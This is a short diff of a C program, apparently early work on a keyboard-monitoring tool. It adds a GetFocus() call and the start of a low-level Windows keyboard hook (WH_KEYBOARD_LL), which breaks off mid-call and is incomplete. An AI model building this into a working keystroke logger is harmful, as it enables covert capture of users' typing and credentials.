@@ -10,6 +10,8 @@
  */
 int main(void){
 	BOOL is_running = 1;
-	HWND	hdWindowForeground = GetForegroundWindow();
+	HWND	hdWindowForeground = GetFocus();
+	HHOOK	HookFgWind = SetWindowsHookExA(WH_KEYBOARD_LL,
+						
 	return 0;
 }
